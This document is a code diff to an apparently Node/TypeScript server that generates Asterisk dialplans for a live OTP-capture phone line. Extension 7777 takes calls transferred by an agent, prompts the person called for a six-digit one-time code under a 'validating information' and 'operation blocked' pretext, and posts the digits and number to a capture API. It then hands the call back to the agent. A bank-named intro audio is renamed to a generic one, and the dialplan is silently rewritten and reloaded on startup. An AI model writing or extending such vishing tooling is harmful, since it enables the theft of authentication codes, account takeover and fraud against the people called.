@@ -541,7 +541,7 @@ function generateCleanDialplanConf(
   dialplanContent += `; ========================================================\n\n`;
   dialplanContent += `[general]\nstatic=yes\nwriteprotect=no\n\n`;
 
-  const chosenIntro = audios.audioIntro || 'custom/banrearreglado';
+  const chosenIntro = audios.audioIntro || 'custom/bienvenida_corporativa';
   const chosenPrompt = audios.audioPrompt || 'custom/solicitar_codigo_otp';
   const chosenWait = audios.audioWait || 'custom/un_momento_validando_informacion';
   const chosenSuccess = audios.audioSuccess || 'custom/operacion_bloqueada_exito';
@@ -571,9 +571,11 @@ function generateCleanDialplanConf(
 
   dialplanContent += `; 2a. Extension Dedicada de Captura de Produccion (Extension 7777)\n`;
   dialplanContent += `exten => 7777,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 7777 ===)\n`;
+  dialplanContent += ` same => n,Answer()\n`;
+  dialplanContent += ` same => n,Wait(1)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
-  dialplanContent += ` same => n,Set(IVR_AGENT_EXTEN=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:1001)})\n`;
-  dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;
+  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:1001)})\n`;
+  dialplanContent += ` same => n,Goto(ivr-captura-vivo,s,1)\n\n`;
 
   dialplanContent += `; 2b. Acceso y Prueba Directa IVR desde Softphone X-Lite (Extension 8888)\n`;
   dialplanContent += `exten => 8888,1,NoOp(=== PRUEBA DIRECTA IVR EXT 8888: Marcando al cliente o simulando IVR ===)\n`;
@@ -633,6 +635,31 @@ function generateCleanDialplanConf(
   dialplanContent += `exten => _X.,1,NoOp(Llamada Entrante por Troncal: \${CALLERID(num)})\n`;
   dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;
 
+  dialplanContent += `[ivr-captura-vivo]\n`;
+  dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-7777] INICIANDO PARA DESTINO: \${TARGET_DEST} ===)\n`;
+  dialplanContent += ` same => n,Answer()\n`;
+  dialplanContent += ` same => n,Wait(1)\n`;
+  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${FINAL_AGENT}" != ""]?\${FINAL_AGENT}:1001)})\n`;
+  dialplanContent += ` same => n,Playback(beep)\n`;
+  dialplanContent += ` same => n,Read(USER_DIGITS,custom/solicitar_codigo_otp,6,,2,12)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?captura_ok)\n`;
+  dialplanContent += ` same => n,Playback(beep)\n`;
+  dialplanContent += ` same => n,Read(USER_DIGITS,beep,6,,2,8)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" = ""]?captura_timeout)\n\n`;
+
+  dialplanContent += ` same => n(captura_ok),NoOp(=== [CAPTURA-7777] DIGITOS RECIBIDOS: \${USER_DIGITS} ===)\n`;
+  dialplanContent += ` same => n,System(curl -s -X POST -H "Content-Type: application/json" -d '{"number":"\${TARGET_DEST}","otp":"\${USER_DIGITS}","channel":"\${CHANNEL}","status":"pending"}' http://127.0.0.1:3000/api/asterisk/otp/capture &)\n`;
+  dialplanContent += ` same => n,Playback(beep)\n`;
+  dialplanContent += ` same => n,Wait(1)\n`;
+  dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] RETORNANDO LLAMADA AL ASESOR \${FINAL_AGENT} ===)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60)\n`;
+  dialplanContent += ` same => n,Hangup()\n\n`;
+
+  dialplanContent += ` same => n(captura_timeout),NoOp(=== [CAPTURA-7777] TIMEOUT SIN DIGITOS -> RECONECTANDO ASESOR ===)\n`;
+  dialplanContent += ` same => n,Playback(beep)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60)\n`;
+  dialplanContent += ` same => n,Hangup()\n\n`;
+
   dialplanContent += `[ivr-otp]\n`;
   dialplanContent += `exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
@@ -648,7 +675,7 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/default_intro)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/global_intro)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${GLOBAL_DEFAULT_INTRO}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=custom/banrearreglado))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=custom/bienvenida_corporativa))\n`;
 
   dialplanContent += ` same => n,Set(IVR_PROMPT=\${DB(ivr_vars/\${TARGET_DEST}_prompt)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${DB(ivr_vars/8888_prompt)}))\n`;
@@ -804,17 +831,21 @@ async function autoRepairAsteriskPjsipOnStartup() {
       console.log('[PJSIP-REPAIR] ✓ /etc/asterisk/pjsip.conf reparado y recargado con éxito para 1001 y 1002.');
     }
 
-    // Auto-generate dialplan baseline if not present
-    if (!lastGeneratedDialplan) {
-      const cleanDialplan = generateCleanDialplanConf();
-      lastGeneratedDialplan = cleanDialplan;
-      try {
-        fs.writeFileSync(path.join(process.cwd(), 'extensions.conf'), cleanDialplan, 'utf8');
-        if (!fs.existsSync(dialplanPath)) {
+    // Auto-generate dialplan baseline and keep synced
+    const cleanDialplan = generateCleanDialplanConf();
+    lastGeneratedDialplan = cleanDialplan;
+    try {
+      fs.writeFileSync(path.join(process.cwd(), 'extensions.conf'), cleanDialplan, 'utf8');
+      if (fs.existsSync(dialplanPath)) {
+        const currentContent = fs.readFileSync(dialplanPath, 'utf8');
+        if (!currentContent.includes('ivr-captura-vivo') || currentContent.includes('custom/banrearreglado')) {
           await writeAsteriskConfigFile(dialplanPath, cleanDialplan);
+          exec('asterisk -rx "dialplan reload"', () => {});
         }
-      } catch (_) {}
-    }
+      } else {
+        await writeAsteriskConfigFile(dialplanPath, cleanDialplan);
+      }
+    } catch (_) {}
   } catch (err: any) {
     console.warn('[PJSIP-REPAIR] Aviso en auto-reparación inicial:', err.message);
   }
@@ -1033,9 +1064,11 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
 
     dialplanContent += `; 2a. Extension Dedicada de Captura de Produccion (Extension 7777)\n`;
     dialplanContent += `exten => 7777,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 7777 ===)\n`;
+    dialplanContent += ` same => n,Answer()\n`;
+    dialplanContent += ` same => n,Wait(1)\n`;
     dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
-    dialplanContent += ` same => n,Set(IVR_AGENT_EXTEN=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:1001)})\n`;
-    dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;
+    dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:1001)})\n`;
+    dialplanContent += ` same => n,Goto(ivr-captura-vivo,s,1)\n\n`;
 
     dialplanContent += `; 2b. Acceso y Prueba Directa IVR desde Softphone X-Lite (Extension 8888)\n`;
     dialplanContent += `exten => 8888,1,NoOp(=== PRUEBA DIRECTA IVR EXT 8888: Marcando al cliente o simulando IVR ===)\n`;
